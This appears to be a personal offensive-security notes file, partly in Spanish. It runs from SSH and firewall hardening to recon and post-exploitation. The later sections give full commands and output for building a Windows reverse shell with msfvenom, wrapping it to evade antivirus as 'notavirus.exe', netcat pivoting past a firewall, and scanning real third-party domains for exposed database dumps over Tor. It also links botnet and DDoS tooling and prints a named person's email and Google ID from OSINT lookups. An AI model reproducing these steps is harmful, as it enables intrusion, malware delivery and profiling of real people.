    scp $env:USERPROFILE/.ssh/id_rsa.pub {username}@{server ip}:~/.ssh/authorized_keys

    Upload your Public key to the your Linux Server (MAC)

    scp ~/.ssh/id_rsa.pub {username}@{server ip}:~/.ssh/authorized_keys

    Upload your Public key to the your Linux Server (LINUX)

    ssh-copy-id {username}@{server ip}


    STEP 4 - Lockdown Logins

    Edit the SSH config file

    sudo nano /etc/ssh/sshd_config


    STEP 5 - FIREWALL IT UP

    See open ports

    sudo ss -tupln

    Install UFW

    apt install ufw

    See UFW status

    sudo ufw status

    Allow port through firewall

    sudo ufw allow {port number}

    Enable Firewall

    sudo ufw enable

    Reload Firewall

    sudo ufw reload


    Drop pings

    Edit the UFW config file

    sudo nano /etc/ufw/before.rules

    Add this line of config:

    -A ufw-before-input -p icmp --icmp-type echo-request -j DROP

# Scan IOT

    Kamerka, it requires api keys to work
    
    https://github.com/woj-ciech/Kamerka-GUI
    
    http://localhost:8000/
    
# How to evaluate phone numbers

    https://apilayer.com/marketplace
    
    There are lot of open api
    
    https://apilayer.com/marketplace/number_verification-api
    
    https://www.numberingplans.com/?page=analysis&sub=phonenr
    
    https://numeracionyoperadores.cnmc.es/portabilidad/movil/operador
    
    https://www.numerosdetelefono.es
    
    google dorks! intext:“918025421" (☎OR ☏ OR ✆ OR 📱)
    
    https://www.abctelefonos.com
    
    https://www.paginasamarillas.es
    
    https://haveibeenpwned.com
    
    https://main.whoisxmlapi.com
    
    https://www.truecaller.com
    
    https://whoscall.com/en
    
    https://sync.me
    
    https://t.me/+123456789
    
    https://api.whatsapp.com/send/?phone=%2B123456789&text&type=phone_number&app_absent=0
    
    https://viber.click/123456789
    
    https://checkwa.online/register/
        
# How to find phising websites using censys.io. In this case, i am searching about websites related with Santander bank, phising websites.

    (santarder*) AND parsed.issuer.organization.raw:"Let's Encrypt"
    
    https://search.censys.io/certificates?q=%28santarder%2A%29+AND+parsed.issuer.organization.raw%3A%22Let%27s+Encrypt%22
    
# Autorecon

    AutoRecon is a multi-threaded network reconnaissance tool which performs automated enumeration of services
    
    https://github.com/Tib3rius/AutoRecon
    
    sudo apt install seclists curl enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
    
    > sudo pip install git+https://github.com/Tib3rius/AutoRecon.git
    ...
    python3 -m pip install -r requirements.txt
    ...
    > sudo python3 autorecon.py  -vvv --single-target localhost
    [*] Scanning target localhost
    [*] Port scan Top TCP Ports (top-tcp-ports) running against localhost
    ...
    
# Sn1per framework Attack Surface management

    Recommended Docker install or aws.
    
    https://sn1persecurity.com/wordpress/
    
    https://github.com/1N3/Sn1per
    
    ┌──(root💀c096301bec63)-[/]
    └─# sniper -t https://7xfx.com -b          
    Starting PostgreSQL 13 database server: main.
    [*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
    [*] Loaded configuration file from /root/.sniper.conf [OK]
    [*] Saving loot to /usr/share/sniper/loot/ [OK]
    [*] Scanning 7xfx.com [OK]
    Starting PostgreSQL 13 database server: main.
    [*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
    [*] Loaded configuration file from /root/.sniper.conf [OK]
    [*] Saving loot to /usr/share/sniper/loot/workspace/https:--7xfx.com [OK]
    [*] Scanning 7xfx.com [OK]
                    ____               
        _________  /  _/___  ___  _____
       / ___/ __ \ / // __ \/ _ \/ ___/
      (__  ) / / // // /_/ /  __/ /    
     /____/_/ /_/___/ .___/\___/_/     
                   /_/                 

     + -- --=[https://sn1persecurity.com
     + -- --=[Sn1per v9.0 by @xer0dayz
     + 
     ...
# Post exploitation techniques
# Netcat pivot relay

    # La idea es que estas redirigiendo tráfico desde un puerto no controlado por el firewall (40) a uno que si está controlado por el firewall (23), 
    # es decir, quieres enviar algo al puerto cerrado por el firewall. Para ello, una vez que tienes acceso a la máquina destino, vas a levantar 
    # un servicio netcat escuchando por el 23 
     
    > nc -lvp 23
    listening on [any] 23 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 42662
    hola
    redirigiendo tráfico desde el puerto 40 que esstara fuera del control del firewall al puerto 23 que si estará controlado por el firewall

    # Luego, en otra máquina o en la misma máquina vulnerable, vas a crear un nodo de caracteres especiales (pivot) que sirva de pila donde enviar el       # exploit
    # man mknod
    # NAME
    #   mknod - make block or character special files
    ...
    
    > mknod pivot  p
    # Creo el puente entre el puerto 40 no filtrado hacia el puerto 23 filtrado por el fw, usando la pila. 
    # Cuando escribo al puerto 40, leo desde la pila, cuando leo desde el 23, escribo a la pila.
        
    > nc -lvp 40 0<pivot | nc 127.0.0.1 23 > pivot
    listening on [any] 40 ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 44386

    # Finalmente creo la conexion al puerto vulnerable. Lo que escriba aquí, finalmente se escribe al puerto supuestamente filtrado por el firewall.
    > nc 127.0.0.1 40
    hola
    redirigiendo tráfico desde el puerto 40 que estara fuera del control del firewall al puerto 23 que si estará controlado por el firewall

    # Podemos usar netcat en conjuncion con otra herramienta, rlwrap. 
    
    https://github.com/hanslub42/rlwrap
    
    # It  returns a standard netcat listener on port 4444. 
    # However, your shell will be improved with added benefit of allowing you to cycle between used  commands by using your Up-Arrow and Down-Arrow         keys.
    
    > rlwrap -cAr nc -nvlp 4444
    listening on [any] 4444 ...
    
    # creating a windows tcp shell tcp reverse on port 4444, use your ip address.
    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.Y.Z.W  LPORT=4444 -f exe -a x64 -o shell.exe
    [?] Would you like to init the webservice? (Not Required) [no]: no
    Clearing http web data service credentials in msfconsole
    Running the 'init' command for the database:
    Existing database found, attempting to start it
    Starting database at /home/kali/.msf4/db...success
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: shell.exe
    > ls -ltah shell.exe
    -rw-r--r-- 1 kali kali 7.0K Aug  5 11:59 shell.exe

# 3bowla
    
    Using the previous shell.exe process created with msfvenom...
    
    A python3 version of the Antivirus (AV) evasion framework ebowla.

    > sudo python3 ebowla.py shell.exe genetic.config
    Overall : {'Encryption_Type': 'ENV', 'output_type': 'GO', 'minus_bytes': '1', 'payload_type': 'EXE', 'key_iterations': '10000', 'clean_output': 'False'}
    otp_settings : {'otp_type': 'key', 'pad': 'cmd.exe', 'pad_max': '0xffffff', 'scan_dir': 'c:\\windows\\sysnative', 'byte_width': '9'}
    symmetric_settings_win : {'ENV_VAR': {'username': 'Administrator', 'computername': '', 'homepath': '', 'homedrive': '', 'Number_of_processors': '', 'processor_identifier': '', 'processor_revision': '', 'userdomain': '', 'systemdrive': '', 'userprofile': '', 'path': '', 'temp': ''}, 'PATH': {'path': '', 'start_loc': '%HOMEPATH%'}, 'IP_RANGES': {'external_ip_mask': ''}, 'SYSTEM_TIME': {'Time_Range': ''}}
    [*] Using Symmetric encryption
    [*] Payload length 7168
    [*] Payload_type exe
    [*] Using EXE payload template
    [*] Used environment variables:
            [-] environment value used: username, value used: administrator
    [*] Path string used as part of key: b''
    [!] External IP mask NOT used as part of key
    [!] System time mask NOT used as part of key
    [*] String used to source the encryption key: b'administrator'
    [*] Applying 10000 sha512 hash iterations before encryption
    [*] Encryption key is: d7f740196206d2a46b638ccc3aecceb1d47326d06a1870f9b9fe98f20ca2155b
    [*] Writing GO payload to: go_symmetric_shell.exe.go
    
    > ls
    build_x64_go.sh  build_x86_go.sh  cleanup.py  documentation.md  ebowla.py  encryption  genetic.config  LICENSE.md  MemoryModule  output  __pycache__  README.md  shell.exe  templates  test
    > find . -name go_symmetric_shell.exe.go
    ./output/go_symmetric_shell.exe.go
    
    > ls ./output
    go_symmetric_shell.exe.go
    
    > ls output
    go_symmetric_shell.exe.go
    > ./build_x64_go.sh output/go_symmetric_shell.exe.go notavirus.exe
    [*] Copy Files to tmp for building
    [*] Building...
    [*] Building complete
    [*] Copy notavirus.exe to output
    cp: cannot create regular file './output/notavirus.exe': Permission denied
    [*] Cleaning up
    [*] Done
    
    # ups, cannot create the file.
    
    > sudo ./build_x64_go.sh output/go_symmetric_shell.exe.go notavirus.exe
    [*] Copy Files to tmp for building
    [*] Building...
    [*] Building complete
    [*] Copy notavirus.exe to output
    [*] Cleaning up
    [*] Done
    > ls output
    go_symmetric_shell.exe.go  notavirus.exe

# Finally i have a tcp shell reverse for windows x64, in order to be used with my ip and some port...
# Lets check results:

    shell.exe:
    
    https://www.virustotal.com/gui/file/785cc759b3ec0cf003bbeb45796eba3f63cdf613bd03bb18dd96bf49fffd5aa5?nocache=1
    
    notavirus.exe
    
    https://www.virustotal.com/gui/file/0fbc4800d9f5f6672e2f4fb6b250831e4ea8c4361a27c531b92c608ca1d90d01?nocache=1
    
    conclusion, notavirus is still marked as suspicious in virustotal...
    
# Port forwarding or pivoting with a SOCKS proxy.

    chisel

    A fast TCP/UDP tunnel, transported over HTTP, secured via SSH. This tool can be used for port forwarding or pivoting with a SOCKS proxy.
    
    https://github.com/jpillora/chisel
    
# Flameshot

    sudo apt install flameshot
    
# Escalada de privilegios linux, Osx y windows

    https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
    
    https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
    
# Enumerar ficheros creados con SUID. TODO, algo tengo que hacer porque este script ha detectado cosas sospechosas...

    https://www.compuhoy.com/que-es-suid-en-linux/
    
    Description

    A standalone script supporting both python2 & python3 to find out all SUID binaries in machines/CTFs and do the following

    List all Default SUID Binaries (which ship with linux/aren't exploitable)
    List all Custom Binaries (which don't ship with packages/vanilla installation)
    List all custom binaries found in GTFO Bin's (This is where things get interesting)
    Printing binaries and their exploitation (in case they create files on the machine)
    Try and exploit found custom SUID binaries which won't impact machine's files

    https://github.com/Anon-Exploiter/SUID3NUM
    
    > python suid3num.py
      ___ _   _ _ ___    _____  _ _   _ __  __ 
     / __| | | / |   \  |__ / \| | | | |  \/  |
     \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
     |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar

    [#] Finding/Listing all SUID Binaries ..
    ------------------------------
    /opt/google/chrome/chrome-sandbox
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                               
    /usr/lib/openssh/ssh-keysign                                                                                                                                                                              
    /usr/lib/xorg/Xorg.wrap                                                                                                                                                                                   
    /usr/lib/chromium/chrome-sandbox                                                                                                                                                                          
    /usr/bin/kismet_cap_linux_bluetooth                                                                                                                                                                       
    /usr/bin/vmware-user-suid-wrapper                                                                                                                                                                         
    /usr/bin/gpasswd                                                                                                                                                                                          
    /usr/bin/su                                                                                                                                                                                               
    /usr/bin/kismet_cap_ti_cc_2531                                                                                                                                                                            
    /usr/bin/ntfs-3g                                                                                                                                                                                          
    /usr/bin/pkexec                                                                                                                                                                                           
    /usr/bin/chsh                                                                                                                                                                                             
    /usr/bin/chfn                                                                                                                                                                                             
    /usr/bin/kismet_cap_nrf_mousejack                                                                                                                                                                         
    /usr/bin/ksu                                                                                                                                                                                              
    /usr/bin/sudo                                                                                                                                                                                             
    /usr/bin/kismet_cap_nrf_51822                                                                                                                                                                             
    /usr/bin/kismet_cap_ti_cc_2540                                                                                                                                                                            
    /usr/bin/passwd                                                                                                                                                                                           
    /usr/bin/kismet_cap_linux_wifi                                                                                                                                                                            
    /usr/bin/kismet_cap_nxp_kw41z                                                                                                                                                                             
    /usr/bin/kismet_cap_rz_killerbee                                                                                                                                                                          
    /usr/bin/kismet_cap_nrf_52840                                                                                                                                                                             
    /usr/bin/mount                                                                                                                                                                                            
    /usr/bin/kismet_cap_ubertooth_one                                                                                                                                                                         
    /usr/bin/newgrp                                                                                                                                                                                           
    /usr/bin/umount                                                                                                                                                                                           
    /usr/bin/fusermount3                                                                                                                                                                                      
    /usr/share/atom/chrome-sandbox                                                                                                                                                                            
    /usr/share/discord-canary/chrome-sandbox                                                                                                                                                                  
    /usr/libexec/polkit-agent-helper-1                                                                                                                                                                        
    /usr/sbin/mount.nfs                                                                                                                                                                                       
    /usr/sbin/mount.cifs                                                                                                                                                                                      
    /usr/sbin/pppd                                                                                                                                                                                            
    /usr/sbin/exim4                                                                                                                                                                                           
    ------------------------------                                                                                                                                                                            


    [!] Default Binaries (Don't bother)                                                                                                                                                                       
    ------------------------------                                                                                                                                                                            
    /opt/google/chrome/chrome-sandbox                                                                                                                                                                         
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                               
    /usr/lib/openssh/ssh-keysign                                                                                                                                                                              
    /usr/lib/xorg/Xorg.wrap                                                                                                                                                                                   
    /usr/lib/chromium/chrome-sandbox                                                                                                                                                                          
    /usr/bin/vmware-user-suid-wrapper                                                                                                                                                                         
    /usr/bin/gpasswd                                                                                                                                                                                          
    /usr/bin/su                                                                                                                                                                                               
    /usr/bin/ntfs-3g                                                                                                                                                                                          
    /usr/bin/pkexec                                                                                                                                                                                           
    /usr/bin/chsh                                                                                                                                                                                             
    /usr/bin/chfn                                                                                                                                                                                             
    /usr/bin/sudo                                                                                                                                                                                             
    /usr/bin/passwd                                                                                                                                                                                           
    /usr/bin/mount                                                                                                                                                                                            
    /usr/bin/newgrp                                                                                                                                                                                           
    /usr/bin/umount                                                                                                                                                                                           
    /usr/share/atom/chrome-sandbox                                                                                                                                                                            
    /usr/share/discord-canary/chrome-sandbox                                                                                                                                                                  
    /usr/libexec/polkit-agent-helper-1                                                                                                                                                                        
    /usr/sbin/mount.nfs                                                                                                                                                                                       
    /usr/sbin/mount.cifs                                                                                                                                                                                      
    /usr/sbin/pppd                                                                                                                                                                                            
    /usr/sbin/exim4                                                                                                                                                                                           
    ------------------------------                                                                                                                                                                            


    [~] Custom SUID Binaries (Interesting Stuff)                                                                                                                                                              
    ------------------------------                                                                                                                                                                            
    /usr/bin/kismet_cap_linux_bluetooth                                                                                                                                                                       
    /usr/bin/kismet_cap_ti_cc_2531                                                                                                                                                                            
    /usr/bin/kismet_cap_nrf_mousejack                                                                                                                                                                         
    /usr/bin/ksu                                                                                                                                                                                              
    /usr/bin/kismet_cap_nrf_51822                                                                                                                                                                             
    /usr/bin/kismet_cap_ti_cc_2540                                                                                                                                                                            
    /usr/bin/kismet_cap_linux_wifi                                                                                                                                                                            
    /usr/bin/kismet_cap_nxp_kw41z                                                                                                                                                                             
    /usr/bin/kismet_cap_rz_killerbee                                                                                                                                                                          
    /usr/bin/kismet_cap_nrf_52840                                                                                                                                                                             
    /usr/bin/kismet_cap_ubertooth_one                                                                                                                                                                         
    /usr/bin/fusermount3                                                                                                                                                                                      
    ------------------------------                                                                                                                                                                            


    [#] SUID Binaries found in GTFO bins..                                                                                                                                                                    
    ------------------------------                                                                                                                                                                            
    [!] None :(                                                                                                                                                                                               
    ------------------------------                                                                                                                                                                            
     

# Build your own bot framework

    Follow these instructions, https://github.com/malwaredllc/byob/wiki/Running-Web-GUI-in-a-Docker-container
    build the container, run it, go to 0.0.0.0:5000 in browser.
    
# DDOS scripts. Do not use them!

    https://github.com/IkzCx/ProgramsForDDos
    
# Wifi wardriving

    I modified a bit s4vitar`s version. I have an alfa awu0360h
    
    https://gist.github.com/alonsoir/ebb659ceb939700f577caf33b512d23b
    
    https://gist.github.com/
    
    sudo ./s4viPwnWifi.sh -a  PKMID -n wlan0
    
    airgeddon
    
    https://github.com/v1s1t0r1sh3r3/airgeddon
    
# Commands to hack some web vulnerability

    https://gist.github.com/alonsoir/dff9e961ed090464808e9018080ea6fe   
    
    https://www.youtube.com/watch?v=ggkUREL6djQ&t=4321s
    
# OSINT

# Recon web sites, semippassives

# subwalker, searching subdomains

    https://github.com/m8sec/SubWalker
    
    > ./subwalker.sh northernrich.com
    [*] Executing SubWalker against: northernrich.com
    [*] Launching SubScraper
    [*] Launching Sublist3r
    [*] Launching assetfinder
    [*] Waiting until all scripts complete...
    cat: subscraper.txt: No such file or directory
    cat: sublist3r.txt: No such file or directory
    rm: cannot remove 'subscraper.txt': No such file or directory
    rm: cannot remove 'sublist3r.txt': No such file or directory

    [+] SubWalker complete with 4 results
    [+] Output saved to: /home/kali/git/subwalker/subwalker.txt
    > cat subwalker.txt
    mail.northernrich.com
    northernrich.com
    ns.northernrich.com
    www.northernrich.com
    
# Subscraper, searching subdomains

    https://github.com/m8sec/subscraper

    > subscraper --all --censys-id someId --censys-secret blablebliblobluxD northernrich.com

         ___      _    ___                                                                                                                                                                                    
        / __|_  _| |__/ __| __ _ _ __ _ _ __  ___ _ _                                                                                                                                                         
        \__ \ || | '_ \__ \/ _| '_/ _` | '_ \/ -_) '_|                                                                                                                                                        
        |___/\_,_|_.__/___/\__|_| \__,_| .__/\___|_| v3.0.2                                                                                                                                                   
                                       |_|           @m8r0wn 

                                       / 4 Subdomains Found.
    [*] Identified 4 subdomain(s) in 0:00:36.093118.
    [*] Subdomains written to ./subscraper_report.txt.
    > cat ./subscraper_report.txt
    www.northernrich.com
    mail.northernrich.com
    ns.northernrich.com
    ftp.northernrich.com
    
# Subfinder,  searching subdomains
    
    https://www.kali.org/tools/subfinder/

    > proxychains subfinder -d as.com -silent
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16
    ...    
    playertop-meristation.as.com
    singapore.as.com

     ⭐  ~  ok  took 31s  at 12:44:23 >  

# httpx

    https://github.com/projectdiscovery/httpx

# subfinder and httpx anonimizado por Tor usando proxychains. Buscando ficheros mysql.sql en subdominios.
    
    > proxychains subfinder -d as.com -silent | httpx silent -path "/wp-content/mysql.sql" -mC 200 -t 250 -ports 80,443,8080,8443
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16

        __    __  __       _  __
       / /_  / /_/ /_____ | |/ /
      / __ \/ __/ __/ __ \|   /
     / / / / /_/ /_/ /_/ /   |
    /_/ /_/\__/\__/ .___/_/|_|
                 /_/              v1.2.0

                    projectdiscovery.io

    Use with caution. You are responsible for your actions.
    Developers assume no liability and are not responsible for any misuse or damage.
    ...
    http://seguro.meristation.as.com
    http://www.meristation.as.com

     ⭐  ~  ok  took 1m 20s  at 12:35:15 >                                                                                     

# spiderfoot. 

    Next command will run a server in localhost 5001 port. Deep scan. In my personal case, i have to run it with sudo.
    
    python3 ./sf.py -l 127.0.0.1:5001
    
    https://github.com/smicallef/spiderfoot

# s1c0n

    https://github.com/root-x-krypt0n-x/s1c0n
    
    > sudo python3 sicon.py -u as.com 
    
                  ┏━┓╺┓ ┏━╸┏━┓┏┓╻
                  ┗━┓ ┃ ┃  ┃┃┃┃┗┫
                  ┗━┛╺┻╸┗━╸┗━┛╹ ╹
                
                    Simple Recon
                Coded by UnknownSec666
                   Thanks to: Jeager

        [*] Starting recon on as.com:

          [+] WAF: NOT DETECTED

          [+] OPENED PORTS: 2
            -> 80/tcp  open  http
            -> 443/tcp open  https
            
          [+] SUBDOMAINS DETECTED: 194
            -> xn--90as.com | [80, 113, 443, 2000, 5060, 8008]
            -> telegra.ph | [80, 113, 443, 2000, 5060, 8008]
            -> www.mail.megastore.as.com | FAIL MAYBE HOST DIED
            -> my.as.com | [80, 443]
            -> seuglucmachespti.tk | [80, 443, 8080, 8443]
            -> meristation.as.com | [80]
            -> 2fmeristation.as.com | FAIL MAYBE HOST DIED
            -> backend.meristation.as.com | [80]
            -> parrillatv.api.as.com | FAIL MAYBE HOST DIED
            -> www.toogas.com | [80, 443, 8080, 8443]
            -> dy6.jgdy99.com | [80, 113, 443, 2000, 5060, 8008, 8080, 8443]
            -> serielistas.as.com | [80, 443]
            -> entradas.as.com | [80, 443]
            -> as.com | [80, 443]
            -> colombia.as.com | [80, 443]
            -> be.as.com | FAIL MAYBE HOST DIED
            -> *.resultados.as.com | FAIL MAYBE HOST DIED
            -> api.preferences.as.com | [80, 443]
            -> www.ultra--as.com | FAIL MAYBE HOST DIED
            -> sdmedia.as.com | [80, 443]
            -> fan.as.com | [80, 443]
            -> login.meristation.as.com | [80]

# Web scrapper

    https://github.com/m8sec/pymeta
    
    > pymeta -d as.com -s all -f as.com.csv

    [*] Starting PyMeta web scraper
    [*] Extension  |  Number of New Files Found  |  Search URL
    [!] Captcha'ed by google: Skipping this source...
    [*] pdf :  0 http://www.bing.com/search?q=site:as.com%20filetype:pdf&first=0
    [*] xls :  0 http://www.bing.com/search?q=site:as.com%20filetype:xls&first=0
    [*] xlsx:  0 http://www.bing.com/search?q=site:as.com%20filetype:xlsx&first=0
    [*] csv :  0 http://www.bing.com/search?q=site:as.com%20filetype:csv&first=0
    [*] doc :  2 http://www.bing.com/search?q=site:as.com%20filetype:doc&first=0
    [*] doc :  0 http://www.bing.com/search?q=site:as.com%20filetype:doc&first=34
    [*] docx:  0 http://www.bing.com/search?q=site:as.com%20filetype:docx&first=0
    [*] ppt :  0 http://www.bing.com/search?q=site:as.com%20filetype:ppt&first=0
    [*] pptx:  0 http://www.bing.com/search?q=site:as.com%20filetype:pptx&first=0
    [*] Downloading 2 files to: ./as.c_meta2/
    [*] Extracting Metadata...
    [*] Adding source URL's to the report
    [+] Report complete: as.com.csv


    # Set of osint websites
    
    https://osint.hopain.cyou/Domain.html
    
    # Searching in Linkedin...
    
    https://github.com/m8sec/CrossLinked
    
    > python3 crosslinked.py -f '{first}.{last}@sopra.com' "sopra steria"

         _____                    _             _            _                                                                                                                                                
        /  __ \                  | |   (x)     | |          | |                                                                                                                                               
        | /  \/_ __ ___  ___ ___ | |    _ _ __ | | _____  __| |                                                                                                                                               
        | |   | '__/ _ \/ __/ __|| |   | | '_ \| |/ / _ \/ _` |                                                                                                                                               
        | \__/\ | | (_) \__ \__ \| |___| | | | |   <  __/ (_| |                                                                                                                                               
         \____/_|  \___/|___/___/\_____/_|_| |_|_|\_\___|\__,_| v0.1.0                                                                                                                                        

        @m8r0wn                                                                                                                                                                                               

    [*] Searching google for valid employee names at "sopra steria"
    [!] No results found
    [*] Searching bing for valid employee names at "sopra steria"
    [...
    [+] 90 unique names added to names.txt!
    > cat names.txt
    ...
    
    # PyWhat. Identify what something is, online. Use it with pcap files, btc adresses,...
    
    https://reconshell.com/pywhat-identify-anything/
    
    https://github.com/bee-san/pyWhat
    
    # Basilisk. It uses shodan api to find vulnerable camaras.
    
    https://github.com/spicesouls/basilisk
    
    https://epieos.com provide an email to get data.
    
    https://github.com/lulz3xploit/LittleBrother todo!
    
    https://github.com/tgscan/tgscan-data

    # Iky -> pretty amazing. Provide an email and get data!
    
    https://kennbroorg.gitlab.io/ikyweb/
    
    Run redis-server first
    
    go to folder backend and run the script with sudo
    
    sudo python app.py -e prod
    
    https://gitlab.com/kennbroorg/iKy/blob/iKy/README.md
    
    http://127.0.0.1:4200/pages/apikeys
    
    # OSRF framework, set of tools
    
    https://github.com/i3visio/osrframework
    
    # Phone numbers search, phoneinfoga
    
    https://github.com/sundowndev/phoneinfoga
    
    just type in terminal phoneinfoga serve
    
    a gui will be open in localhost:5000
    
    # Osintgram (Instagram)
    
    https://github.com/Datalux/Osintgram
    
    clone the project, run the next commands to create the docker container:
    
    docker build -t osintgram .
    
    make setup -> put your credentials
    
    make run -> execute
    
    It has some workarounds the moment i tried, but it looks interesting
    
    # xeuledoc
    
    Fetch information about any public Google document.
    
    https://github.com/Malfrats/xeuledoc
    
    > xeuledoc  https://docs.google.com/document/d/1if1Fq_pcHAP0RYla-lsuAI-7BwWL7yCR9nWp8yU1k6M/edit
    Twitter : @MalfratsInd
    Github : https://github.com/Malfrats/xeuledoc

    Document ID : 1if1Fq_pcHAP0RYla-lsuAI-7BwWL7yCR9nWp8yU1k6M

    [+] Creation date : 2020/10/27 21:51:56 (UTC)
    [+] Last edit date : 2020/11/17 10:15:03 (UTC)

    Public permissions :
    - reader
    [+] You have special permissions :
    - reader
    - commenter

    [+] Owner found !

    Name : Samantha Menot
    Email : samantha.menot@databricks.com
    Google ID : 15790401968530511716
    
    # Dante's Gate -> set of tools. It has a lot of errors, probably it is a non maintained version...
    
    https://github.com/Quantika14/osint-suite-tools
    
    > pwd
    /home/kali/git/osint-suite-tools
    > ls
    bots               BuscadorNick.py            BuscadorPersonas.py   data     modules      README.md         search_engines
    BuscadorEmails.py  BuscadorNoticiasFalsas.py  BuscadorTelefonos.py  LICENSE  __pycache__  requiriments.txt  targets.txt
    > sudo python3 -m BuscadorPersonas
    [sudo] password for kali: 


            T U T I O W Y M V R M D Y I H C H A S E Q G P L 3 W 5 K G X 9 B 0
            R X D A N T E ' S   G A T E S   M I N I M A L   V E R S I O N K 2
            5 3 J I T 7 Q Y Q L D M S K Y H L N A W C O M H B C O 9 I N A K G

            Jorge Coronado (aka @JorgeWebsec)
            01.06.02


          ____________________________________________________________________________________________________

          Discleimer: This application allows you to create intelligence through open sources. 
          You do not access information that is not public. The author is not responsible for its use.
          ____________________________________________________________________________________________________

          Description: Dante's Gates Minimal Version is an open application with a GNU license for OSINT with
          Spanish and international sources. Currently it is maintained by Jorge Coronado and there are other
          versions such as mobile and APIs for your applications.
          ----
          Important: the author of this software is not responsible for it's use. The App aims to help
          researchers in OSINT, not to do evil. For more information contact the author.


    None
    __________________________________________________
    | 1. Name, surnames  and DNI                     |
    | 2. Search names and surnames in list           |
    |________________________________________________|

    Select 1/2/3: 

    # more tools, creators of Dante's Gate 
    
    https://github.com/Quantika14 
    
    # Gephi (installed in osx...) TODO
    
    https://gephi.org/users/download/
    
    # Blockchain explorer
    
    https://www.blockchain.com/explorer
    
    # Spiderfoot -> TODO
    
    https://github.com/smicallef/spiderfoot?ref=d
    
    set api keys -> todo
    
    https://sf-e3814fe.hx.spiderfoot.net/optsapi
    
    # TrueCaller -> spam teléfonico
    
    https://www.truecaller.com
    
# Passive collection of information:

    1) google dorks! -> 
    
        https://github.com/m3n0sd0n4ld/GooFuzz -> TODO
    
        https://www.hackingloops.com/google-dorks/ 

        https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/

        Understanding Google Dorks Operators:

        intitle – This allows a hacker to search for pages with specific text in their HTML title. 
        So intitle: “login page” will help a hacker scour the web for login pages.

        allintitle – Similar to the previous operator, but only returns results for pages that meet all of the keyword criteria.

        inurl – Allows a hacker to search for pages based on the text contained in the URL (i.e., “login.php”).

        allinurl – Similar to the previous operator, but only returns matches for URLs that meet all the matching criteria.

        filetype – Helps a hacker narrow down search results to specific files such as PHP, PDF, or TXT file types.

        ext – Very similar to filetype, but this looks for files based on their file extension.

        intext – This operator searches the entire content of a given page for keywords supplied by the hacker.

        allintext – Similar to the previous operator but requires a page to match all of the given keywords.

        site – Limits the scope of a query to a single website.

    2) Shodan.io

    3) Censys.io

    4) theHarvester-> kali version is broken! muy limitado, no me gusta. Muy agresivo, google te bloquea enseguida. 
    Habría que jugar con las opciones para ver si es menos agresivo.
    
    https://github.com/laramies/theHarvester
    
    python3 theHarvester.py -d https://www.northernrich.com/en -g -s -v -n -b all

    5) Maltego -> powerfull, but interesting stuff is not free

    6) recon-ng
    
    https://www.nosolohacking.info/recon-ng-instalacion/
    
    7) archive.org
    
    8) Sherlock
    
    > sherlock --print-all --browse andrewmakokha575@gmail.com
    [*] Checking username andrewmakokha575@gmail.com on:
    ...
    [+] Coil: https://coil.com/u/andrewmakokha575@gmail.com
    [-] ColourLovers: Not Found!
    ...

    9) > maigret XYZ@gmail.com
    [-] Starting a search on top 500 sites from the Maigret database...
    [!] You can run search by full list of sites with flag `-a`

    maigret works with python3.8, so probably you have to activate the environment:
    
    conda create -m mypython3.8 ipykernel=3.8
    conda activate mypython3.8
    pip3 install maigret
    ...
    
    after the work, deactivate it
    
    conda deactivate
    
    10) https://whatsmyname.app/
    
# Semi-passive pickup:

    1) Foca. Only windows. Metadata gathering recovery tool. 

    2) dnsdumpster -> https://dnsdumpster.com/

    3) centralOps -> https://centralops.net/co/

    4) whireshark -> packet sniffer

    5) tcpdump -> packet sniffer

# Active collection:

    1) dnsRecon
    
    dnsrecon -s -a  -f -b -y -k -w  -z  -v -t brt --db /home/kali/Desktop/work/dns-recon-sql-northernrich.file -d https://www.northernrich.com/admin -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --xml /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    
    > dnsrecon -s -a  -f -b -y -k -w  -z  -v -t std --db /home/kali/Desktop/work/dns-recon-sql-northernrich.file -d https://www.northernrich.com/admin  --xml /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    zsh: correct '/home/kali/Desktop/work/dnsrecon1-northernrich.xml' to '/home/kali/Desktop/work/dnsrecon-northernrich.xml' [nyae]? n
    [*] std: Performing General Enumeration against: https://www.northernrich.com/admin...
    [*] Checking for Zone Transfer for https://www.northernrich.com/admin name servers
    [*] Resolving SOA Record
    [*] Resolving NS Records
    [*] NS Servers found:
    [*] Removing any duplicate NS server IP Addresses...
    [*] Checking for Zone Transfer for https://www.northernrich.com/admin name servers
    [*] Resolving SOA Record
    [*] Resolving NS Records
    [*] NS Servers found:
    [*] Removing any duplicate NS server IP Addresses...
    [*] Saving records to XML file: /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    [*] Saving records to SQLite3 file: /home/kali/Desktop/work/dns-recon-sql-northernrich.file
    
    > dnsrecon -d www.northernrich.com -D /usr/share/wordlists/dnsmap.txt -t std --xml /home/kali/Desktop/work/dnsrecon-northernrich.xml
    [*] std: Performing General Enumeration against: www.northernrich.com...
    [-] DNSSEC is not configured for www.northernrich.com
    [*]      SOA ns.northernrich.com 150.107.31.61
    [*]      NS ns.northernrich.com 150.107.31.61
